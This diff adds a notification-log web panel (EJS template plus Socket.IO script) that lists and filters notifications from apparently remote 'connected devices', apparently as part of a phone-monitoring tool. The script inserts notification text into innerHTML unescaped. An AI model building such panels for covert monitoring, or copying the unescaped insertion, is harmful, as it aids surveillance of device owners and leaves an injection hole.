@@ -1,0 +1,438 @@
+<div class="ui segment">
+    <div class="ui top attached menu">
+        <div class="item">
+            <h3 class="ui header">
+                <i class="bell icon"></i>
+                <div class="content">
+                    Notification Log
+                    <div class="sub header">Real-time notifications from connected devices</div>
+                </div>
+            </h3>
+        </div>
+        <div class="right menu">
+            <div class="item">
+                <div class="ui toggle checkbox" id="realtimeToggle">
+                    <input type="checkbox" checked>
+                    <label>Real-time Mode</label>
+                </div>
+            </div>
+            <div class="item">
+                <button class="ui blue button" id="refreshAllNotifications">
+                    <i class="refresh icon"></i>
+                    Refresh All Notifications
+                </button>
+            </div>
+            <div class="item">
+                <button class="ui green button" id="getAllStoredNotifications">
+                    <i class="database icon"></i>
+                    Get All Stored
+                </button>
+            </div>
+            <div class="item">
+                <button class="ui orange button" id="getAllNotificationsFromDB">
+                    <i class="download icon"></i>
+                    Get All from DB
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Real-time notification alert -->
+    <div class="ui bottom attached message" id="realtimeAlert" style="display: none;">
+        <i class="info circle icon"></i>
+        <span id="realtimeMessage">Waiting for notifications...</span>
+    </div>
+    
+    <!-- Device Filter -->
+    <div class="ui segment" id="deviceFilter" style="display: none;">
+        <div class="ui form">
+            <div class="field">
+                <label>Filter by Device:</label>
+                <select class="ui dropdown" id="deviceSelect">
+                    <option value="all">All Devices</option>
+                </select>
+            </div>
+        </div>
+    </div>
+    
+    <table class="ui celled table" id="notificationTable">
+        <thead>
+            <tr>
+                <th>Time</th>
+                <th>Device</th>
+                <th>App</th>
+                <th>Title</th>
+                <th>Content</th>
+                <th>Priority</th>
+            </tr>
+        </thead>
+        <tbody id="notificationTableBody">
+            <% pageData.forEach((notification) => { 
+                // Handle different timestamp formats
+                let timestamp = notification.postTime || notification.timestamp || notification.receivedTime || Date.now();
+                if (typeof timestamp === 'string') {
+                    timestamp = parseInt(timestamp);
+                }
+                let date = new Date(timestamp);
+            %>
+            <tr>
+                <td class="collapsing">
+                    <div class="ui mini label">
+                        <%= date.toLocaleString('en-GB', { timeZone: 'UTC' }) %>
+                    </div>
+                </td>
+                <td class="collapsing">
+                    <div class="ui mini label" title="<%= notification.clientID || 'Unknown Device' %>">
+                        <i class="mobile icon"></i>
+                        <%= (notification.clientID || 'Unknown').substring(0,15) %>
+                    </div>
+                </td>
+                <td class="collapsing">
+                    <div class="ui mini label" title="<%= notification.appName %>">
+                        <i class="bell icon"></i>
+                        <%= notification.appName.substring(0,20) %>
+                    </div>
+                </td>
+                <td>
+                    <strong><%= notification.title %></strong>
+                </td>
+                <td>
+                    <%= notification.content %>
+                </td>
+                <td class="collapsing">
+                    <% if (notification.priority === 'HIGH') { %>
+                        <div class="ui red mini label">HIGH</div>
+                    <% } else if (notification.priority === 'DEFAULT') { %>
+                        <div class="ui blue mini label">DEFAULT</div>
+                    <% } else { %>
+                        <div class="ui grey mini label"><%= notification.priority || 'UNKNOWN' %></div>
+                    <% } %>
+                </td>
+            </tr>
+            <% }) %>
+        </tbody>
+    </table>
+</div>
+
+<script>
+// Real-time notification handling for notification_log.ejs
+
+const socket = io();
+let realtimeEnabled = true;
+let connectedDevices = new Set();
+
+// Auto-load notifications when page loads
+socket.on('connect', function() {
+    console.log('✅ Connected to server for real-time notifications');
+    console.log('📡 Socket ID:', socket.id);
+    console.log('🔌 Socket connected:', socket.connected);
+    const alert = document.getElementById('realtimeAlert');
+    const message = document.getElementById('realtimeMessage');
+    message.textContent = 'Connected to server - ready for real-time notifications';
+    alert.className = 'ui bottom attached positive message';
+    alert.style.display = 'block';
+    
+    // Auto-load stored notifications when connected
+    loadStoredNotifications();
+    
+    // Test if we can receive notifications
+    console.log('🧪 Testing notification reception...');
+    socket.emit('test_connection', { message: 'Web panel connected' }, function(response) {
+        console.log('📨 Test response:', response);
+    });
+});
+
+// Load stored notifications automatically from database
+function loadStoredNotifications() {
+    console.log('📊 Loading notifications from database...');
+    socket.emit('get_all_notifications_from_db', {}, function(response) {
+        if (response && response.success && response.notifications && response.notifications.length > 0) {
+            console.log('📊 Auto-loading', response.notifications.length, 'stored notifications from database');
+            const tbody = document.getElementById('notificationTableBody');
+            tbody.innerHTML = '';
+            connectedDevices = new Set();
+            
+            response.notifications.forEach(notification => {
+                addNotificationToTable(notification, false);
+            });
+            
+            document.getElementById('deviceFilter').style.display = 'block';
+            updateDeviceFilter();
+            
+            showAlert('success', `Auto-loaded ${response.notifications.length} stored notifications from database`);
+        } else {
+            console.log('📊 No notifications found in database');
+            // Also try to load from pageData (server-side rendered data)
+            if (typeof pageData !== 'undefined' && pageData && pageData.length > 0) {
+                console.log('📊 Loading', pageData.length, 'notifications from server-rendered data');
+                const tbody = document.getElementById('notificationTableBody');
+                tbody.innerHTML = '';
+                connectedDevices = new Set();
+                
+                pageData.forEach(notification => {
+                    addNotificationToTable(notification, false);
+                });
+                
+                document.getElementById('deviceFilter').style.display = 'block';
+                updateDeviceFilter();
+            }
+        }
+    });
+}
+
+// Toggle real-time mode
+document.getElementById('realtimeToggle').addEventListener('change', function() {
+    realtimeEnabled = this.checked;
+    const alert = document.getElementById('realtimeAlert');
+    if (realtimeEnabled) {
+        alert.style.display = 'block';
+        alert.querySelector('#realtimeMessage').textContent = 'Real-time mode enabled - waiting for notifications...';
+        alert.className = 'ui bottom attached message';
+    } else {
+        alert.style.display = 'none';
+    }
+});
+
+// Refresh all notifications button
+document.getElementById('refreshAllNotifications').addEventListener('click', function() {
+    window.location.reload();
+});
+
+// Get all stored notifications button
+document.getElementById('getAllStoredNotifications').addEventListener('click', function() {
+    const button = this;
+    const originalText = button.innerHTML;
+    button.innerHTML = '<i class="spinner loading icon"></i>Loading...';
+    button.disabled = true;
+
+    socket.emit('get_all_notifications', {}, function(response) {
+        if (response && response.notifications) {
+            const tbody = document.getElementById('notificationTableBody');
+            tbody.innerHTML = '';
+            connectedDevices = new Set();
+            response.notifications.forEach(notification => {
+                addNotificationToTable(notification, false);
+            });
+            document.getElementById('deviceFilter').style.display = 'block';
+            updateDeviceFilter();
+            showAlert('success', `Loaded ${response.notifications.length} stored notifications from all devices`);
+        } else {
+            showAlert('error', 'No stored notifications found');
+        }
+        button.innerHTML = originalText;
+        button.disabled = false;
+    });
+});
+
+// Get all notifications from database button
+document.getElementById('getAllNotificationsFromDB').addEventListener('click', function() {
+    const button = this;
+    const originalText = button.innerHTML;
+    button.innerHTML = '<i class="spinner loading icon"></i>Loading from DB...';
+    button.disabled = true;
+
+    console.log('📊 Requesting all notifications from database...');
+    
+    socket.emit('get_all_notifications_from_db', {}, function(response) {
+        console.log('📨 Database response:', response);
+        
+        if (response && response.success && response.notifications) {
+            const tbody = document.getElementById('notificationTableBody');
+            tbody.innerHTML = '';
+            connectedDevices = new Set();
+            
+            console.log(`📊 Found ${response.notifications.length} notifications in database`);
+            
+            response.notifications.forEach(notification => {
+                addNotificationToTable(notification, false);
+            });
+            
+            document.getElementById('deviceFilter').style.display = 'block';
+            updateDeviceFilter();
+            showAlert('success', `Loaded ${response.notifications.length} notifications from database (${response.source || 'clientData/*.json'})`);
+        } else {
+            console.log('❌ No notifications found in database');
+            showAlert('error', 'No notifications found in database (clientData/*.json)');
+        }
+        
+        button.innerHTML = originalText;
+        button.disabled = false;
+    });
+});
+
+// Device filter change
+document.getElementById('deviceSelect').addEventListener('change', function() {
+    const selectedDevice = this.value;
+    filterNotificationsByDevice(selectedDevice);
+});
+
+// Listen for real-time notifications
+socket.on('notification_received', function(data) {
+    console.log('🔔 REAL-TIME NOTIFICATION RECEIVED IN WEB PANEL!');
+    console.log('=====================================');
+    console.log('📱 App:', data.data.appName || 'Unknown');
+    console.log('📦 Package:', data.data.packageName || 'Unknown');
+    console.log('📝 Title:', data.data.title || 'No title');
+    console.log('💬 Text:', data.data.text || 'No text');
+    console.log('⏰ Time:', data.data.postTimeFormatted || 'Unknown');
+    console.log('⭐ Important:', data.data.isImportant ? 'YES' : 'NO');
+    console.log('📂 Category:', data.data.category || 'Other');
+    console.log('🔔 Priority:', data.data.priority || 'Unknown');
+    console.log('📄 Content:', data.data.content || 'No content');
+    console.log('=====================================');
+    
+    if (!realtimeEnabled) {
+        console.log('⚠️ Real-time mode disabled, ignoring notification');
+        return;
+    }
+    
+    // Update alert message with detailed info
+    const alert = document.getElementById('realtimeAlert');
+    const message = document.getElementById('realtimeMessage');
+    message.textContent = `🚨 NEW NOTIFICATION: ${data.data.appName} - ${data.data.title}`;
+    alert.className = 'ui bottom attached positive message';
+    alert.style.display = 'block';
+    
+    // Add notification to table with highlight
+    addNotificationToTable(data.data, true);
+    
+    // Show detailed notification info
+    showDetailedNotification(data.data);
+    
+    // Auto-hide alert after 5 seconds
+    setTimeout(() => {
+        alert.style.display = 'none';
+    }, 5000);
+});
+
+// Show detailed notification info (like terminal)
+function showDetailedNotification(notification) {
+    const details = `
+        🚨 REAL-TIME NOTIFICATION RECEIVED!
+        =====================================
+        📱 App: ${notification.appName || 'Unknown'}
+        📦 Package: ${notification.packageName || 'Unknown'}
+        📝 Title: ${notification.title || 'No title'}
+        💬 Text: ${notification.text || 'No text'}
+        ⏰ Time: ${notification.postTimeFormatted || 'Unknown'}
+        ⭐ Important: ${notification.isImportant ? 'YES' : 'NO'}
+        📂 Category: ${notification.category || 'Other'}
+        🔔 Priority: ${notification.priority || 'Unknown'}
+        📄 Content: ${notification.content || 'No content'}
+        =====================================
+    `;
+    console.log(details);
+}
+
+function addNotificationToTable(notification, isNew = true) {
+    const tbody = document.getElementById('notificationTableBody');
+    const row = document.createElement('tr');
+    if (isNew) row.className = 'positive';
+    const date = new Date(parseInt(notification.timestamp || notification.postTime));
+    const timeString = date.toLocaleString('en-GB', { timeZone: 'UTC' });
+    let priorityBadge = '';
+    if (notification.priority === 'HIGH') {
+        priorityBadge = '<div class="ui red mini label">HIGH</div>';
+    } else if (notification.priority === 'DEFAULT') {
+        priorityBadge = '<div class="ui blue mini label">DEFAULT</div>';
+    } else {
+        priorityBadge = `<div class="ui grey mini label">${notification.priority || 'UNKNOWN'}</div>`;
+    }
+    const deviceId = notification.clientID || notification.deviceId || 'Unknown';
+    connectedDevices.add(deviceId);
+    row.innerHTML = `
+        <td class="collapsing">
+            <div class="ui mini label">
+                ${timeString}
+            </div>
+        </td>
+        <td class="collapsing">
+            <div class="ui mini label" title="${deviceId}">
+                <i class="mobile icon"></i>
+                ${deviceId.substring(0,15)}
+            </div>
+        </td>
+        <td class="collapsing">
+            <div class="ui mini label" title="${notification.appName}">
+                <i class="bell icon"></i>
+                ${notification.appName ? notification.appName.substring(0,20) : ''}
+            </div>
+        </td>
+        <td>
+            <strong>${notification.title || ''}</strong>
+        </td>
+        <td>
+            ${notification.content || ''}
+        </td>
+        <td class="collapsing">
+            ${priorityBadge}
+        </td>
+    `;
+    row.dataset.deviceId = deviceId;
+    row.dataset.appName = notification.appName;
+    tbody.insertBefore(row, tbody.firstChild);
+    if (isNew) {
+        setTimeout(() => {
+            row.className = '';
+        }, 5000);
+    }
+    while (tbody.children.length > 200) {
+        tbody.removeChild(tbody.lastChild);
+    }
+}
+
+function updateDeviceFilter() {
+    const deviceSelect = document.getElementById('deviceSelect');
+    const currentValue = deviceSelect.value;
+    deviceSelect.innerHTML = '<option value="all">All Devices</option>';
+    connectedDevices.forEach(deviceId => {
+        const option = document.createElement('option');
+        option.value = deviceId;
+        option.textContent = deviceId.substring(0, 20);
+        deviceSelect.appendChild(option);
+    });
+    deviceSelect.value = currentValue;
+}
+
+function filterNotificationsByDevice(deviceId) {
+    const tbody = document.getElementById('notificationTableBody');
+    const rows = tbody.querySelectorAll('tr');
+    rows.forEach(row => {
+        if (deviceId === 'all' || row.dataset.deviceId === deviceId) {
+            row.style.display = '';
+        } else {
+            row.style.display = 'none';
+        }
+    });
+}
+
+function showAlert(type, message) {
+    const alert = document.getElementById('realtimeAlert');
+    const messageElement = document.getElementById('realtimeMessage');
+    messageElement.textContent = message;
+    alert.className = `ui bottom attached ${type} message`;
+    alert.style.display = 'block';
+    setTimeout(() => {
+        alert.style.display = 'none';
+    }, 5000);
+}
+
+// Connection status handlers
+socket.on('disconnect', function() {
+    console.log('❌ Disconnected from server');
+    const alert = document.getElementById('realtimeAlert');
+    const message = document.getElementById('realtimeMessage');
+    message.textContent = 'Disconnected from server - real-time notifications unavailable';
+    alert.className = 'ui bottom attached negative message';
+    alert.style.display = 'block';
+});
+
+socket.on('connect_error', function(error) {
+    console.log('❌ Connection error:', error);
+    const alert = document.getElementById('realtimeAlert');
+    const message = document.getElementById('realtimeMessage');
+    message.textContent = 'Connection error: ' + error.message;
+    alert.className = 'ui bottom attached negative message';
+    alert.style.display = 'block';
+});
+</script>
